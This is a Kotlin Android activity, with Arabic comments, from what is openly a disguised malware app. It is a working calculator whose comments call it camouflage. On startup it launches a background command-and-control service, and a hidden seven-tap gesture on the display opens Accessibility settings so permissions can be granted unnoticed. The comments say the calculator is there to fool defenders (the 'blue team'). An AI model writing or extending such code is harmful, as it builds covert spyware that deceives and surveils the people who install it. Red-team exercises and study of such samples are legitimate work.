package com.example.disguise

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.disguise.core.C2Service
import com.example.disguise.util.PermissionHelper

/**
 * MainActivity — واجهة التمويه (آلة حاسبة).
 *
 * المسؤوليات:
 * 1. عرض آلة حاسبة تعمل بشكل طبيعي (تمويه كامل).
 * 2. عند النقر 7 مرات على شاشة العرض (tvDisplay)، تُفتح شاشة الأذونات.
 * 3. طلب إذن POST_NOTIFICATIONS (Android 13+) عند أول تشغيل.
 * 4. بدء C2Service في الخلفية (بعد الحصول على الإذن أو مباشرة).
 *
 * التمويه:
 * - الآلة الحاسبة تعمل فعلاً (جمع، طرح، ضرب، قسمة، نسبة).
 * - لا توجد أي واجهة "مشبوهة".
 * - النقر 7 مرات إجراء مخفي (لن يلاحظه الفريق الأزرق).
 *
 * ملاحظة: المنطق الحسابي بسيط (عمليتان فقط). آلة حاسبة علمية كاملة
 * تتطلب كوداً أطول، لكن هذا يكفي للتمويه.
 */
class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val SECRET_TAP_COUNT = 7
        private const val SECRET_TAP_WINDOW_MS = 3000L  // 3 ثوانٍ بين النقرات
        private const val REQ_NOTIFICATIONS = 101
    }

    // ---- حالة الآلة الحاسبة ----
    private var displayValue: String = "0"
    private var firstOperand: Double? = null
    private var pendingOp: String? = null
    private var isNewInput: Boolean = true

    // ---- النقر السري (7 مرات) ----
    private var secretTapCount = 0
    private var lastTapTime = 0L

    // ---- مراجع UI ----
    private lateinit var tvDisplay: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvDisplay = findViewById(R.id.tvDisplay)

        setupCalculatorButtons()
        setupSecretTap()

        // طلب إذن الإشعارات (Android 13+)
        requestNotificationPermissionIfNeeded()

        // بدء C2Service (إذا كان البوت مُهيأً)
        // نبدأه هنا لأن التطبيق قد لا يُفتح أبداً بعد التثبيت
        try {
            C2Service.start(this)
            Log.d(TAG, "C2Service.start() called")
        } catch (e: Exception) {
            Log.e(TAG, "failed to start C2Service: ${e.message}", e)
        }
    }

    // ============================================================
    // 1. إعداد أزرار الآلة الحاسبة
    // ============================================================

    private fun setupCalculatorButtons() {
        // أرقام
        val digitIds = mapOf(
            R.id.btn0 to "0", R.id.btn1 to "1", R.id.btn2 to "2",
            R.id.btn3 to "3", R.id.btn4 to "4", R.id.btn5 to "5",
            R.id.btn6 to "6", R.id.btn7 to "7", R.id.btn8 to "8",
            R.id.btn9 to "9"
        )
        digitIds.forEach { (id, digit) ->
            findViewById<Button>(id).setOnClickListener { onDigit(digit) }
        }

        // النقطة العشرية
        findViewById<Button>(R.id.btnDot).setOnClickListener { onDot() }

        // العمليات
        findViewById<Button>(R.id.btnPlus).setOnClickListener { onOperator("+") }
        findViewById<Button>(R.id.btnMinus).setOnClickListener { onOperator("−") }
        findViewById<Button>(R.id.btnMultiply).setOnClickListener { onOperator("×") }
        findViewById<Button>(R.id.btnDivide).setOnClickListener { onOperator("÷") }

        // النسبة المئوية
        findViewById<Button>(R.id.btnPercent).setOnClickListener { onPercent() }

        // يساوي
        findViewById<Button>(R.id.btnEquals).setOnClickListener { onEquals() }

        // مسح
        findViewById<Button>(R.id.btnClear).setOnClickListener { onClear() }
    }

    private fun onDigit(d: String) {
        if (isNewInput) {
            displayValue = if (d == "0") "0" else d
            isNewInput = false
        } else {
            displayValue = if (displayValue == "0") d else displayValue + d
        }
        updateDisplay()
    }

    private fun onDot() {
        if (isNewInput) {
            displayValue = "0."
            isNewInput = false
        } else if (!displayValue.contains(".")) {
            displayValue += "."
        }
        updateDisplay()
    }

    private fun onOperator(op: String) {
        val current = displayValue.toDoubleOrNull() ?: 0.0
        if (pendingOp != null && !isNewInput) {
            val result = calculate(firstOperand ?: 0.0, current, pendingOp!!)
            displayValue = formatNumber(result)
            firstOperand = result
        } else {
            firstOperand = current
        }
        pendingOp = op
        isNewInput = true
        updateDisplay()
    }

    private fun onEquals() {
        val current = displayValue.toDoubleOrNull() ?: 0.0
        val op = pendingOp
        if (op != null && firstOperand != null) {
            val result = calculate(firstOperand!!, current, op)
            displayValue = formatNumber(result)
            firstOperand = null
            pendingOp = null
            isNewInput = true
            updateDisplay()
        }
    }

    private fun onPercent() {
        val current = displayValue.toDoubleOrNull() ?: 0.0
        displayValue = formatNumber(current / 100.0)
        isNewInput = true
        updateDisplay()
    }

    private fun onClear() {
        displayValue = "0"
        firstOperand = null
        pendingOp = null
        isNewInput = true
        updateDisplay()
    }

    private fun calculate(a: Double, b: Double, op: String): Double {
        return when (op) {
            "+" -> a + b
            "−" -> a - b
            "×" -> a * b
            "÷" -> if (b == 0.0) Double.NaN else a / b
            else -> b
        }
    }

    private fun formatNumber(v: Double): String {
        if (v.isNaN()) return getString(R.string.calc_error)
        if (v.isInfinite()) return getString(R.string.calc_divide_by_zero)
        return if (v == v.toLong().toDouble()) v.toLong().toString()
        else String.format(java.util.Locale.US, "%.6f", v).trimEnd('0').trimEnd('.')
    }

    private fun updateDisplay() {
        tvDisplay.text = displayValue
    }

    // ============================================================
    // 2. النقر السري (7 مرات على شاشة العرض)
    // ============================================================

    private fun setupSecretTap() {
        tvDisplay.setOnClickListener {
            val now = System.currentTimeMillis()
            if (now - lastTapTime > SECRET_TAP_WINDOW_MS) {
                secretTapCount = 0
            }
            lastTapTime = now
            secretTapCount++

            Log.d(TAG, "secret tap: $secretTapCount/$SECRET_TAP_COUNT")

            if (secretTapCount >= SECRET_TAP_COUNT) {
                secretTapCount = 0
                openPermissions()
            }
        }
    }

    /**
     * فتح شاشة الأذونات.
     * نفتح شاشة إمكانية الوصول أولاً (الأهم)، ثم يمكن للمستخدم
     * فتح البقية عبر أزرار في شاشة الإعدادات.
     *
     * ملاحظة: يمكنك استبدال هذا بـ Intent إلى PermissionActivity
     * إذا أنشأت شاشة منفصلة.
     */
    private fun openPermissions() {
        Toast.makeText(this, "فتح إعدادات الأذونات…", Toast.LENGTH_SHORT).show()
        PermissionHelper.openAccessibilitySettings(this)
    }

    // ============================================================
    // 3. إذن الإشعارات (Android 13+)
    // ============================================================

    private fun requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(
                    this, Manifest.permission.POST_NOTIFICATIONS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                    REQ_NOTIFICATIONS
                )
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQ_NOTIFICATIONS) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "POST_NOTIFICATIONS granted")
            } else {
                Log.w(TAG, "POST_NOTIFICATIONS denied")
            }
        }
    }
}